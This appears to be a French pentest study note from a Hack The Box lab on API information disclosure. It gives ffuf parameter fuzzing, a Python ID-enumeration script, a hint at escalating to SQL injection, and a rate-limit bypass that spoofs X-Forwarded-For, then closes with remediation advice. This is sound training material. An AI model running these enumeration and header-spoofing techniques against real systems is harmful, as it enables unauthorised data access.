# 🧩 Information Disclosure (Fuzzing)

Lié : [[08 - SQL Injection]] · [[17 - Outils ffuf sqlmap]] · [[16 - Arsenal Scripts SQLi]]

---

## Principe

Des misconfigurations ou paramètres cachés d'une API peuvent révéler des données sensibles. La clé : passer **beaucoup de temps à fuzzer** — paramètres, endpoints, valeurs.

---

## Trouver un paramètre caché (le piège de la taille constante)

API sur port 3003 : rien d'utile en surface. On fuzze les noms de paramètres :
```bash
# 1) SANS filtre → toutes les réponses ont la même taille (ex. 19)
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u 'http://<TARGET>:3003/?FUZZ=test_value'
```
> ⚠️ Réponses toutes identiques (taille 19) = l'API renvoie le même texte pour tout paramètre inconnu (pas de 404). L'info est noyée.

```bash
# 2) Filtre cette taille → l'anomalie ressort
ffuf -w .../burp-parameter-names.txt \
     -u 'http://<TARGET>:3003/?FUZZ=test_value' -fs 19
# → id [Status: 200, Size: 38]   ← le bon paramètre
```

Vérification :
```bash
curl http://<TARGET>:3003/?id=1
# [{"id":"1","username":"admin","position":"1"}]
```

---

## Énumérer par incrémentation d'ID

Script Python (voir aussi [[16 - Arsenal Scripts SQLi]]) :
```python
import requests, sys
def brute():
    for val in range(10000):
        r = requests.get(sys.argv[1] + '/?id=' + str(val))
        if "position" in r.text:
            print("Found!", val, r.text)
brute()
```
```bash
python3 brute_api.py http://<TARGET>:3003
```

> ❓ *Question HTB* : username de l'utilisateur `id=3` → `curl http://<TARGET>:3003/?id=3`.

---

## Escalade → SQL Injection

Ce paramètre `id` est souvent injecté dans une requête SQL → tester une **SQLi** (voir [[08 - SQL Injection]]). C'est ainsi qu'on récupère un user par un critère non-énumérable (ex. `position=736373`, valeur trop grande pour être un ID séquentiel → inversion de la logique de recherche via UNION).

---

## Bonus — Bypass de rate limit par headers

Beaucoup d'API font une whitelist d'IP mal codée, basée sur un header que **tu** contrôles :
```php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)) { header("HTTP/1.1 401"); }
```
→ Bypass : ajoute simplement le header avec une IP whitelistée.
```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://<TARGET>/endpoint
# variantes utiles : X-Forwarded-IP, X-Real-IP, X-Originating-IP, X-Remote-IP, X-Client-IP
```
> 💰 Un des bypass les plus rentables et fréquents en vrai.

---

## Remédiation

- Réponses cohérentes (404 pour l'inconnu, pas de fuite de structure).
- Contrôle d'accès sur chaque objet (éviter l'IDOR).
- Ne jamais faire confiance aux headers `X-Forwarded-*` pour l'autorisation.

Tags : #info-disclosure #fuzzing #idor #ffuf
